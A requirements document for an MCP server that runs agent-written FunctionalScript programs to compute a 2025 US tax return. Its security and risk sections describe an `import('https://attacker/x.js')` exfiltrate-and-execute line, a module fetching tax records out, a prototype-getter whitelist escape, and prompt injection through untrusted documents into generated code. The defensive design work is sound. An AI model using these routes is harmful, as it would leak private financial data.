# Requirements

**Milestone:** v1
**Derived from:** [`.planning/PROJECT.md`](PROJECT.md) · [`todo/plan.md`](../todo/plan.md) · [`fjs/todo/implement-mcp-server.md`](../fjs/todo/implement-mcp-server.md) · [`.planning/research/SUMMARY.md`](research/SUMMARY.md)
**Status:** scoped 2026-08-03

---

## Scope Decisions

These were settled by the user on 2026-08-03 and constrain everything below. Where a
decision overrides a research recommendation, that is recorded explicitly — research
informs, it does not decide.

| Decision | Choice | Note |
|---|---|---|
| **Client** | stdio now, targeting Claude Code / Claude Desktop. **Remote transport (HTTPS + OAuth) is an explicit v2 milestone**, not an unstated assumption. | Resolves C3. ChatGPT cannot connect to a stdio server; the README goal statement must be amended to say so rather than leaving the gap to surface in acceptance. |
| **Tax year** | **TY2025** | **Overrides research's TY2024 recommendation (C4).** Research argued TY2025 could not be diffed against a filed return "at build time" — that reasoning assumed building during the 2025 filing season. It is August 2026 and TY2025 was filed in April 2026, so a filed return exists and Success Criterion 1 is satisfiable. The surviving objection is parameter churn (OBBBA retroactively revised the standard deduction; Schedule 1-A is new), which is a data-sourcing task, not a blocker. |
| **Taxpayer profile** | 65+, has brokerage sales, has dependents, itemizes — "whatever makes it more real-life" | Maximal realism. This is the single largest scope driver in this document and it is a deliberate choice, not an accident. See "Scope Consequences" below. |
| **Security** | Worked on later | The `import()` hole and the exfiltration gap are **accepted and deferred**, not solved. See SEC-* for what v1 still does, and "Accepted Risks" for what it does not. |
| **Entry point** | A distinct export typed `(args) => Effect<CasOp, T>` — not `main` | Answers `todo/plan.md` open question 6, added by Sergey in PR #10. **Adopted over the research recommendation** of `main(ctx)`: research argued for CLI debuggability, but a `CasOp`-scoped signature puts the whitelist in the *type*, and since research separately proved the runtime whitelist is escapable today, the type-level boundary is worth more than `fjs r` compatibility. See EXEC-07. |

### Scope Consequences

The taxpayer profile forces a materially larger form surface than research recommended.
Research's suggested v1 was 1040 core + Schedule B + three document dialects. The selected
profile is roughly 4–5× that:

- **65+ combined with TY2025 makes Schedule 1-A mandatory**, not optional — a 65+ TY2025
  return that omits the senior deduction (Parts I/V/VI, 6% phase-out over $75k/$150k) is
  structurally wrong, not merely incomplete.
- **65+ realistically implies SSA-1099 and 1099-R.** The Social Security Benefits
  Worksheet is a 19-line near-circular computation — research flagged it as one of the two
  hardest single computations in the domain.
- **Brokerage sales pull in the whole capital-gains chain**: 1099-B → Form 8949 →
  Schedule D → the Schedule D Tax Worksheet (strictly harder than the QDCGT worksheet).
  Capital loss carryover also promotes multi-year support from "nice to have" to
  "required".
- **Dependents add Schedule 8812; itemizing adds Schedule A.**

This is buildable and the realism goal is legitimate. It is *not* a five-week v1 in the
shape `todo/plan.md` currently describes. The tiering below exists so the roadmap can
sequence honestly and so the cut line is visible in advance rather than discovered in
week four.

---

## v1 Requirements

Tier labels indicate sequencing pressure, not importance:
**T0** must exist before anything else works · **T1** is the thin end-to-end slice ·
**T2** completes the declared taxpayer profile · **T3** is realism polish.

### Documentation Corrections (DOC-C)

Research found twelve places where a planning document states something now known to be
false. These are hours of work and every one of them is more expensive to discover later.
They come first because subsequent phases would otherwise be planned against text that
dissolves on contact.

- [x] **DOCC-01** *(T0)*: Remove the "validate source with `djs/parser`" remedy from
      `PROJECT.md`, `todo/plan.md`, and `fjs/todo/implement-mcp-server.md`. DJS is a data
      language with no function node; the remedy does not exist. Replace with the deferred
      hardening path.
- [x] **DOCC-02** *(T0)*: ~~Correct the "an operation not in the map simply cannot happen"
      claim to state the guard condition that makes it true.~~ **Done** — and the condition
      is now satisfied by fjs itself as of 0.41.0 (`at` + `assert` in `match`), so the claim
      is true as written. `PROJECT.md` Context records why.
- [x] **DOCC-03** *(T0)*: Amend the README `## Goal` and `PROJECT.md` Success Criterion 2
      to name Claude Code / Claude Desktop as the demonstration client, and record remote
      transport as a v2 milestone.
- [x] **DOCC-04** *(T0)*: Correct `fjs/todo/implement-mcp-server.md`'s claim that the
      server cannot be proof-tested — true of `casMcpServer`, false of `fjs_run`, because
      `import` is already an effect with a virtual interpreter.
- [x] **DOCC-05** *(T0)*: Rewrite the `import()` deferral justification in `PROJECT.md` so
      it rests on schedule grounds with named compensating controls, not on "the sole user
      is trusted and local" — the untrusted party is the document, not the user.
- [x] **DOCC-06** *(T0)*: Record the TY2025 parameter-churn hazard: parameters must come
      from Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32**, never from the
      original 2025 inflation-adjustment release.
- [x] **DOCC-07** *(T0)*: Reconcile the storage-layer money representation with
      AGENTS.md's absolute rule that money in a stored JSON document is a string, never a
      JSON number. Correct EXACT-05's text above and `ROADMAP.md`'s Phase 4 success
      criterion 4 and Phase 5 depends-on line, all of which still specified integer cents
      as a JSON *number* at the storage boundary. Only the storage layer flips — exact
      rationals inside computation and decimal strings on the MCP wire are unaffected.

### MCP Server (MCP)

- [x] **MCP-01** *(T0)*: An MCP server over stdio composing fjs's `casToolRegistry` and
      `evoToolRegistry` plus our own, via the exported `fromRegistry` / `mcpStep` /
      `stdioTransport`. No fork of FunctionalScript.
- [x] **MCP-02** *(T0)*: The server registers successfully with `claude mcp add` and
      completes a full `initialize` → `notifications/initialized` → `tools/list` →
      `tools/call` session.
- [x] **MCP-03** *(T0)*: Declare our own `McpConfig` pinned to protocol version
      `2025-11-25`. Do not reuse `casConfig`, which pins `2024-11-05` and identifies the
      server as `functionalscript-cas`.
- [x] **MCP-04** *(T0)*: The impure launcher is a thin root-level `.js` file; all logic
      lives in `.f.js` modules it calls.
- [x] **MCP-05** *(T0)*: stdout carries JSON-RPC and nothing else, asserted in CI across a
      full session. Any diagnostic output goes to stderr.
- [x] **MCP-06** *(T1)*: `finance_schema(dialect)` returns the RTTI schema for a document
      dialect, so the agent reads field names rather than guessing them.
- [ ] **MCP-07** *(T1)*: `finance_tax_params(year)` returns the tax-year parameter set, so
      the agent reads parameters rather than recalling them.
- [ ] **MCP-08** *(T2)*: `finance_documents_list` enumerates stored documents with their
      dialect, tax year, and subject.
- [ ] **MCP-09** *(T3)*: `fjs_check(hash)` smoke-checks a stored program — imports it and
      confirms it exports `main` returning an `Effect` — without running it to completion.
      An agent-productivity feature with **no** security value; it must not be described as
      a security control.

### Execution Spine (EXEC)

- [x] **EXEC-01** *(T0)*: A restricted effect interpreter, `interpret(map)(effect)`,
      translating a guest effect into a host effect. Depends on `fjs/effects` only — not
      CAS, not Evo, not MCP — so it is fully proof-testable in isolation.
- [x] **EXEC-02** *(T0)*: ~~Operation lookup uses `Object.hasOwn` and the operation map has
      a null prototype.~~ **Delivered upstream in fjs 0.41.0**, which this repo now uses:
      `match` looks up via `at` (`getOwnPropertyDescriptor`-based, prototype chain never
      consulted) and `assert`s the handler exists. Verified — the `__defineGetter__` escape
      now throws. Keep a null-prototype map as cheap defence in depth, but it is no longer
      load-bearing and no local guard is required.
- [x] **EXEC-03** *(T0)*: A non-whitelisted operation is refused with a message naming the
      operation *and* the permitted set (`operation not permitted: fetch; permitted:
      casRead, evoList, evoHead, evoRevision`). Agents self-correct from actionable errors
      and cannot from opaque ones. Still ours: 0.41.0 throws the command name but knows
      nothing of the permitted set. **The throw is a bare string, not an `Error`** (`assert`
      throws its message), so the catch must use the caught value directly — `e.message` is
      `undefined` and an `e instanceof Error` branch misses every refusal.
- [x] **EXEC-04** *(T0)*: Regression proofs for prototype-inherited names specifically:
      `constructor`, `toString`, `valueOf`, `hasOwnProperty`, `__defineGetter__`. These are
      the cases a naive `in` or `!== undefined` guard admits. Still wanted after the 0.41.0
      fix — they now pin behaviour we depend on rather than merely hope for, and they cover
      our refusal *reporting*, which is still ours. Assert on the reported text, not the raw
      throw. Include the two-step `__defineGetter__` escalation (install a getter for a
      denied command, then call it).
- [x] **EXEC-05** *(T0)*: The interpreter accumulates the read set as it dispatches, so a
      run record's `inputs[]` is **observed rather than declared**. A program cannot forget
      to cite, or misreport, what it read.
- [x] **EXEC-06** *(T0)*: A step budget bounds execution. `asyncRun` is an unbounded
      `while(true)`; a generated loop with a wrong termination condition otherwise hangs
      the single-process server silently, with no response and no way to cancel.
- [x] **EXEC-07** *(T0)*: A frozen guest ABI. Two constraints fix its shape:
      - **The entry point is a distinct export, not `main`, typed
        `(args) => Effect<CasOp, T>`** — resolving `todo/plan.md` open question 6. fjs
        names entry points by role (`proof` for tests, `main` for Node CLI programs), so a
        report program is a third role. `main` is wrong in both directions: it returns
        `number` (an exit code, not a report), and `NodeProgram = Program<NodeOp>` where
        `NodeOp = … | Fetch | Fs | Http | Forever | Import | …` — a program typed that way
        *declares* it may reach the network. Since `Program<O>` is already generic in the
        operation set, a `CasOp`-scoped signature **puts the whitelist in the type**, so
        `tsc` rejects a network-reaching program before it is ever stored and EXEC-02's
        runtime refusal becomes a backstop rather than the sole defense. Given that the
        runtime defense is currently escapable, that layering is the point. It also settles
        the `forever` sub-question structurally: `Forever` is a `NodeOp` and simply is not
        in `CasOp`. Cost: CLI debuggability via `fjs r`, which resolves `main` literally.
      - **A `ctx` object carries the vocabulary** — combinators, read-only operation
        constructors, money helpers, `args`. Forced by a verified constraint: a blob in CAS
        cannot resolve bare specifiers, so a stored program cannot `import` anything.

      The ABI and the sandbox are the same object, and every stored program is frozen
      against the convention in force when it was written — so this is decided before the
      first program exists, not after.
- [x] **EXEC-08** *(T1)*: An `fjs_run` MCP tool taking `{ hash, args?, subject?, parents? }`
      — **pinned inputs, not just a program hash.** Evo heads resolve at read time, so a
      program that resolves its own heads is not reproducible.
- [x] **EXEC-09** *(T1)*: `fjs_run` reaches `import()` through the `import_` **effect**, not
      a raw expression, making it proof-testable under `fjs/effects/node/virtual` with no
      filesystem.
- [x] **EXEC-10** *(T1)*: The **tool handler** writes the result and run record to CAS —
      not the program. The guest whitelist stays read-only; `casWrite`/`evoAdd` are never
      in it. This makes provenance structural rather than a program-authorship convention.
- [x] **EXEC-11** *(T1)*: `fjs_run` returns result and run-record hashes plus a bounded
      inline preview, with an **explicit size check** before writing the response. The
      stdio line cap is 128 KiB and overflow degrades to a silent `-32603` with no
      indication that size was the problem.
- [x] **EXEC-12** *(T1)*: Total error capture — including non-`Error` throws, missing
      hashes, and import failures — surfaced as a tool-level `errorResult`, never as a
      process crash.
- [ ] **EXEC-13** *(T2)*: Run records mark `pinned: true|false`. Only pinned runs count
      toward reproducibility acceptance.

### Document Formats and Ingestion (DOC)

All dialects follow the `vnd.fjs.revision` precedent: JSON plus a dialect tag, the dialect
as an exact literal in the schema, media type derived mechanically, validation split into
structural (RTTI) and semantic passes.

- [x] **DOC-00** *(T0)*: **One common document base shared by every type** —
      `{ "dialect": "vnd.fjs.<name>", … }` with `dialect` as an exact-literal discriminant,
      so structural validation alone rejects another type's blob. Each type's remaining
      fields are an **fjs RTTI schema** mirroring `revisionSchema`: the schema is the single
      source of truth and the TypeScript type derives from it via `Ts<typeof schema>`, never
      declared twice. Refinements RTTI cannot express structurally (currency exactness, date
      forms, cbase32 hashes) go in a separate semantic check, as `checkReferences` sits
      beside `revisionSchema`. Because an RTTI `Struct` is a string map of types, the base is
      spread into each type — `{ ...base('vnd.fjs.1099'), ...fields }` — rather than needing
      schema inheritance the type system does not have. **Designing the base for the family
      up front is what lets later types land without reopening it**; if a new type forces a
      base change, that is a signal the base was under-designed, worth noting rather than
      absorbing silently.
- [x] **DOC-01** *(T0)*: Evo subject convention — the artifact chain (raw bytes → OCR →
      typed) is rooted at the **cBase32 hash of the original artifact**; each extracted form
      instance gets its own subject keyed on `(payerTin, recipientTin, accountNumber,
      taxYear, formType)`. Human labels live inside snapshots, never in subjects. A subject
      can never be renamed, and CAS has no delete, so this is decided before any real
      document exists.
- [x] **DOC-02** *(T0)*: A **project-local CAS home**, gitignored — not the shared
      `~/.cas`. There is no delete; real SSNs in a shared store cannot be taken back.
- [x] **DOC-03** *(T1)*: `vnd.fjs.ocr` — near-verbatim page-oriented transcription from the
      agent's vision pass, numbers kept as **printed strings** (`"1,234.56"`). Stored as a
      first-class artifact, not a transient step: it is the only record of what the model
      actually saw, and it lets reclassification branch without a second, nondeterministic
      vision pass.
- [x] **DOC-04** *(T1)*: `vnd.fjs.1099int` — typed fields, integer cents, `Number.isSafeInteger`
      guarded. The `"1,234.56" → 123456` conversion happens on exactly one revision
      boundary.
- [x] **DOC-05** *(T2 → pulled forward to Phase 5)*: `vnd.fjs.w2` — box 12 as a list of
      `(code, amount)` pairs (box-12 confusion is a documented model failure); boxes 15–20
      stored faithfully as a repeating array and never computed on.
- [ ] **DOC-06** *(T2)*: `vnd.fjs.1099div`. **Adding this dialect forces the QDCGT
      worksheet** (box 1b > 0) and the Schedule D Tax Worksheet (boxes 2b/2d) — schedule
      the worksheet with the dialect, not after it.
- [ ] **DOC-07** *(T2)*: `vnd.fjs.1099b` — including the distinction that a blank box 1e
      means "basis not reported", which is **not** zero.
- [ ] **DOC-08** *(T2)*: `vnd.fjs.ssa1099` — required by the 65+ profile.
- [ ] **DOC-09** *(T2)*: `vnd.fjs.1099r` — required by the 65+ profile.
- [x] **DOC-10** *(T1)*: Every dialect that transcribes a printed IRS form carries the
      **form revision**, not merely the tax
      year. Box semantics drift between revisions.
- [x] **DOC-11** *(T1)*: Every box is explicitly absent-able. Blank is not zero.
- [x] **DOC-12** *(T1)*: The `CORRECTED` checkbox is modelled as data. It is printed on the
      form itself, so amendment is a read signal, not an inference.
- [ ] **DOC-13** *(T2)*: A consolidated brokerage 1099 yields *N* typed documents from one
      PDF. One uploaded file is not one document.
- [x] **DOC-14** *(T1)*: Documented CLI ingestion route for artifacts over 128 KiB
      (`npx functionalscript cas add`), plus a cache-refresh path so a store mutated by
      another process is visible to the running server without a restart.
- [ ] **DOC-15** *(T2)*: A retraction story via the `archived` flag, and a decision recorded
      on whether report programs must filter archived revisions.
- [ ] **DOC-16** *(T3)*: Dialect registration for `fjs/media`'s `detect`. It imports
      `decodeText`/`mediaType` from `fjs/media/revision` directly and performs exactly one
      check, so `vnd.fjs.revision` is the only dialect it can recognize — its own docstring
      says "currently just `vnd.fjs.revision`", so growth is anticipated but unimplemented.
- [x] **DOC-17** *(T2, added Phase 5)*: `vnd.fjs.medical_expenses` — the substantiation record
      behind Schedule A's medical and dental deduction. Unlike every other dialect it is
      taxpayer-asserted rather than transcribed from an information return: no IRS form
      reports out-of-pocket medical spend. Each entry carries `datePaid` (the deductible year
      is the year PAID), provider, category, amount, and an absent-able `reimbursed` — only
      unreimbursed expense is deductible, and "no reimbursement recorded" must stay
      distinguishable from "the insurer paid nothing". No stored total and no 7.5%-of-AGI
      floor: both need an AGI this document cannot see, and belong to the phase that computes
      Schedule A.
      Per AGENTS.md this is an **fjs change** (take a list of dialect decoders, fall through
      when none match), not local glue — same disposition as the `match` gap. Not blocking:
      our own validation does not need `detect`, which matters only for classifying a blob
      of unknown provenance. *Found independently by both the research pass and Sergey.*

### Exact Arithmetic (EXACT)

- [x] **EXACT-01** *(T0)*: An upstreamable exact-arithmetic module — integer cents, exact
      rationals, and named rounding modes. fjs has none of this: `bigfloat` is a
      decimal→binary literal helper with two exports, `prime_field` is crypto modular
      arithmetic, and `divUp`/`roundUp` round up only and truncate rather than floor on
      negatives. Tax lines carry losses.
- [x] **EXACT-02** *(T0)*: Floating-point never touches tax math. Verified hazards:
      `1.005 * 100 === 100.49999999999999`, `(1.005).toFixed(2) === "1.00"`.
- [x] **EXACT-03** *(T0)*: IRS half-up rounding, explicitly not `Math.round`, which is
      asymmetric (`Math.round(-2.5) === -2`) on a form full of negatives.
- [x] **EXACT-04** *(T0)*: Rounding is a property of a **1040 line**, not of a value —
      `round(sum(x))`, never `sum(round(x))`. A money type that rounds on construction is
      wrong by construction.
- [x] **EXACT-05** *(T1)*: Layering fixed deliberately: money as a decimal **string** in
      JSON at the storage boundary (never a JSON number — decoded to exact cents by the
      semantic check, per AGENTS.md), rationals inside computation, decimal **strings**
      on the MCP wire — fjs's JSON `Primitive` has no `bigint`, so a bigint schema cannot
      cross JSON-RPC.

### Tax Computation (TAX)

- [x] **TAX-01** *(T1)*: TY2025 parameters stored as **data**, keyed by year, each carrying
      a source citation (Rev. Proc. number and section) and an effective date. Sourced from
      Rev. Proc. 2024-40 **as modified by Rev. Proc. 2025-32**.
- [x] **TAX-02** *(T1)*: The IRS Tax Table stored as data and diffed **row by row** against
      the published Publication 1040 as a `proof`. Rows print tax on the interval midpoint,
      so the table disagrees with bracket arithmetic — MFJ $18,000 taxable gives $1,803 by
      table and $1,800 by brackets.
- [ ] **TAX-03** *(T1)*: Explicit line-16 method dispatch across all branches — Tax Table,
      Tax Computation Worksheet, QDCGT worksheet, Schedule D Tax Worksheet — with a proof
      per branch. Line 16 is not bracket arithmetic.
- [x] **TAX-04** *(T1)*: Boundary proofs at `threshold − 1¢`, `threshold`, `threshold + 1¢`
      for every threshold in the parameter data.
- [ ] **TAX-05** *(T1)*: Form 1040 core lines 1a–37.
- [ ] **TAX-06** *(T1)*: Standard deduction with age and blindness increments.
- [ ] **TAX-07** *(T2)*: Schedule B — interest and ordinary dividends, including the $1,500
      threshold and the foreign-account questions.
- [ ] **TAX-08** *(T2)*: Qualified Dividends and Capital Gain Tax Worksheet (~25 lines),
      which calls **back into** the Tax Table for its ordinary-income component.
- [ ] **TAX-09** *(T2)*: **Schedule 1-A Parts I/V/VI** — mandatory given TY2025 + 65+.
      Senior deduction with 6% phase-out over $75k/$150k, feeding Form 1040 line 13b.
- [ ] **TAX-10** *(T2)*: Social Security Benefits Worksheet — a 19-line near-circular
      computation. Required by the 65+ profile.
- [ ] **TAX-11** *(T2)*: Form 8949 and Schedule D, including the Schedule D Tax Worksheet.
      Required by brokerage sales.
- [ ] **TAX-12** *(T2)*: Schedule 8812. Required by dependents.
- [ ] **TAX-13** *(T2)*: Schedule A. Required by itemizing, and it must compare against the
      standard deduction rather than assuming itemizing wins.
- [ ] **TAX-14** *(T2)*: Schedule 1 and Schedule 2/3 to the extent the profile reaches them.
- [ ] **TAX-15** *(T2)*: Worksheets modelled in IRS order, one named pure function per
      worksheet carrying the printed form's line numbers. **No variable named `magi`** — the
      MAGI for the IRA deduction, Roth eligibility, the Premium Tax Credit, IRMAA, and the
      student-loan-interest deduction have different add-back lists.
- [ ] **TAX-16** *(T1)*: A **scope guard** — unmodeled input causes a loud refusal, never a
      silently omitted line. This is what makes a partial 1040 honest instead of quietly
      wrong, and it is how REQ TAX-05's "full line-by-line" claim stays truthful.
- [ ] **TAX-17** *(T3)*: Multi-year support, including capital loss carryover, which the
      brokerage profile promotes from optional to required.

### Provenance and Reporting (PROV)

- [ ] **PROV-01** *(T1)*: A report line type in which `{ value }` without `{ sources }`
      **does not typecheck**. Traceability enforced by the type system, not by convention.
- [ ] **PROV-02** *(T1)*: Every computed line carries `(documentHash, boxPath, value)`
      tuples plus the rule or worksheet line it implements.
- [x] **PROV-03** *(T1)*: A `vnd.fjs.run` record — program hash, observed inputs, result
      hash, status, pinned flag — written by the tool handler on every run.
- [ ] **PROV-04** *(T2)*: Report output states the tax year, the parameter-set hash, and the
      program hash alongside the figures.
- [ ] **PROV-05** *(T2)*: Re-running a pinned program over the same inputs reproduces the
      report **byte-identically**, verified adversarially: add an amended revision *between*
      two runs and assert the output does not move. A reproducibility check that passes
      only because nothing changed is not a check.
- [ ] **PROV-06** *(T3)*: Mechanical Form 1040-X columns from a report diff. Form 1040-X is
      literally a three-column diff (A original, B net change, C correct), so corrected
      document → new revision → re-run → diff yields Columns A/B/C with per-line source
      hashes already attached. No new mechanism required.
- [ ] **PROV-07** *(T2)*: An anti-hardcoding check — CAS read count and numeric-literal
      audit reported with each run, plus a perturbation gate (change an input, assert the
      output moves). `main = () => pure({ line16: 9137 })` satisfies every other criterion
      while defeating the entire thesis.
- [ ] **PROV-08** *(T3)*: A second, non-tax report over the same documents — the cheapest
      possible demonstration that "reports are programs" rather than a tax engine wearing a
      disguise.

### Security (SEC)

Deferred by explicit decision. What remains here is what costs essentially nothing and
would be materially more expensive to retrofit.

- [x] **SEC-01** *(T0)*: The registered `claude mcp add` launcher carries
      `node --permission` with scoped `--allow-fs-*` from the **first** registration.
      Registering later means the unsafe configuration is the one everyone already has.
- [x] **SEC-02** *(T1)*: A textual import-specifier allow-list enforced before a program is
      materialized — roughly 20 lines, and it closes the
      `import('https://attacker/x.js')` exfiltrate-and-execute variant entirely.
- [x] **SEC-03** *(T1)*: Programs materialized under **content-hash-derived filenames**. The
      ESM cache is keyed by URL and never evicts, so a reused temp filename silently re-runs
      the *first* program.
- [x] **SEC-04** *(T0)*: ~~An upstream bug report to FunctionalScript for the `match`
      prototype-dispatch soundness hole.~~ **Done and closed** —
      [functionalscript#1419](https://github.com/functionalscript/functionalscript/pull/1419),
      fixed in 0.41.0. Note
      [functionalscript#1420](https://github.com/functionalscript/functionalscript/issues/1420)
      is a duplicate of the same defect, filed independently from this branch before #1419
      was known here; it is closed as such.

### Integration and End-to-End Testing (TEST)

Added mid-Phase-7, at the user's direction, after an audit found the project had **133
project-local proofs and exactly one real-process test**. Every other proof runs under
`fjs/effects/node/virtual` — mocked filesystem, mocked stdio, no separate OS process.

The audit's finding that forced this section: **the product's central seam cannot be tested in
the virtual harness at all.** `virtual`'s `writeFile` stores a file as an array of `Vec` chunks
while its `import_` requires the entry at a path to be a `JsModule` function — verified against
upstream source. So "write a program's bytes to disk, then `import()` and run them" is
*structurally uncomposable* in a virtual session. Phase 7's own end-to-end plan therefore used a
`JsModule` stand-in for materialization, which means `fjs_run` — the product — would have shipped
with its central seam evidenced only by a mock.

`cas-refresh-cross-process.test.js` already established the pattern and the precedent, and its
header states the principle these requirements generalise: *"an in-process simulation does not
test the thing that breaks."* It was a one-off; this section makes it a practice.

- [x] **TEST-01** *(T1)*: A real-process integration test for `fjs_run`: a genuinely separate
      `node index.js <home>` OS process, driven over **real stdin/stdout JSON-RPC** through a
      full `initialize` → `notifications/initialized` → `tools/list` → `tools/call` session,
      against a real temporary CAS home on a real filesystem. It must assert the returned figure
      and the result/run-record hashes, **and** that the materialized `.mjs` actually reached
      disk — the one assertion no virtual proof can make.
- [x] **TEST-02** *(T1)*: Every MCP tool this project exposes is exercised at least once through
      that real stdio session, not only through `virtual`. A tool proven solely in-process has
      not been proven to be reachable by a client.
- [ ] **TEST-03** *(T2)*: Each subsequent phase that adds a tool, a dialect, or a new seam adds
      real-process coverage for it in the same session harness. The standing rule: a phase is not
      complete when its virtual proofs are green — it is complete when the thing a client would
      actually call has been called.
- [x] **TEST-04** *(T2)*: The integration suite is separable from the fast proof suite, so the
      per-commit loop stays fast while the integration layer still runs before a phase is marked
      complete. Real-process tests cost seconds each; the 133 virtual proofs cost milliseconds
      in total, and conflating them would push developers to skip both.

Scope note, deliberately: these requirements do **not** ask for the virtual proofs to be
replaced. The virtual harness is fast, deterministic, and proves logic well. What it cannot do is
prove that two real subsystems meet. Both layers are wanted; only one of them currently exists.

---

## v2 (Deferred)

- **Remote transport** — HTTPS + OAuth + tenancy, which is what ChatGPT support requires.
  Explicitly a milestone, per the client decision above.
- **Child-process isolation** with a wall-clock kill. The only way to bound a synchronous
  runaway from outside; a reliability fix as much as a security one.
- **Network egress control.** `--permission` has no network permission (see Accepted Risks).
- **A real FunctionalScript source validator** built on `fjs/js/tokenizer` + `fjs/bnf`, *if*
  it is ever wanted — for portability, not security. Multi-week upstream work.
- **Upstream contributions**: the restricted interpreter as a generic runner, the exact
  arithmetic module, the CAS effect vocabulary, and the `detect` dialect registry.
- **TY2024 and earlier parameter sets**, once TY2025 is proven.
- **"What if" scenarios as a named capability.** Program execution largely dissolves the
  feature — a scenario is another agent-authored program over branched inputs — but shipping
  it as a tested, named capability is v2.
- **TaxCalcBench as a graded acceptance harness** (51 public cases), pending a licensing and
  input-format check.

---

## Out of Scope

- **PDF text extraction in code** — permanently, not deferred. OCR is the agent's own vision
  pass emitting structured JSON. No PDF library, no OCR engine, no third-party service.
- **CSV / OFX / QFX parsers** — the vision-to-dialect path covers ingestion; a second
  parallel parser stack duplicates it for marginal gain.
- **State tax returns** — store W-2 boxes 15–20 faithfully, compute nothing.
- **1099-NEC and self-employment** — the three-box simplicity is a trap; the downstream is
  Schedule C / SE / QBI.
- **Non-US jurisdictions.**
- **Multi-user operation** — no auth, no tenancy, no per-user store isolation in v1.
- **E-filing or transmission** — output is figures to review and transcribe.
- **A `finance_compute_1040` tool** — would destroy the thesis permanently. The agent would
  call it and never author a program again.
- **A "tax engine" module** — recreates precisely the thing the architecture exists to avoid.

---

## Accepted Risks

Recorded because "security will be worked on later" is a decision, and a decision deserves
to be written down with its consequences rather than left implicit.

| Risk | Status |
|---|---|
| **`import()` runs a blob's module body with full Node privileges** before any effect is interpreted. The operation whitelist does not cover it. | Accepted for v1. Mitigated in part by SEC-01 (`--permission`) and SEC-02 (specifier allow-list). Not closed. |
| **No network permission in Node's permission model.** A malicious module body can `fetch()` the complete tax record out. | Accepted and unmitigated in-process. An OS-level control (container, `sandbox-exec`, egress rule) was offered and deferred. |
| **The trust chain is untrusted document → LLM → generated program → execution.** Injection is unusually easy because "write a program and run it" is the sanctioned action. | Accepted. The compensating control is provenance discipline: only documents the user obtained themselves, in a session they initiated. |
| **CAS has no delete.** A wrongly ingested document — a spouse's return, a screenshot with a password — cannot be removed. | Mitigated by DOC-02 (project-local store) and DOC-15 (`archived` flag). Retraction remains a policy question, not a capability. |

---

## Traceability

Populated by the roadmapper from [`.planning/ROADMAP.md`](ROADMAP.md).
**All 79 v1 requirements map to exactly one phase. No orphans, no duplicates.**

Milestones are `todo/plan.md`'s weeks and keep its names; phases are sliced underneath
them. Week 0 is research's addition in front of the plan's Week 1.

| REQ-ID | Tier | Phase | Milestone | Status |
|--------|------|-------|-----------|--------|
| DOCC-01 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-02 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-03 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-05 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-06 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-07 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| MCP-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-02 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-03 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-04 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-05 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-06 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| MCP-07 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Pending |
| MCP-08 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Pending |
| MCP-09 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Pending |
| TEST-01 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| TEST-02 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| TEST-03 | T2 | Phases 8-15 - standing, per phase | Weeks 2-5 | Pending |
| TEST-04 | T2 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| EXEC-01 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-02 | T0 | Delivered upstream (fjs 0.41.0, functionalscript#1419) | Week 1 | Done |
| EXEC-03 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-04 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-05 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-06 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-07 | T0 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| EXEC-08 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| EXEC-09 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| EXEC-10 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| EXEC-11 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| EXEC-12 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| EXEC-13 | T2 | Phase 14 - Acceptance | Week 4 | Pending |
| DOC-00 | T0 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-01 | T0 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-02 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| DOC-03 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-04 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-05 | T2 | Phase 5 - Document Base and First Dialects (pulled forward) | Week 1 | Complete |
| DOC-06 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
| DOC-07 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
| DOC-08 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Pending |
| DOC-09 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Pending |
| DOC-10 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-11 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-12 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-13 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
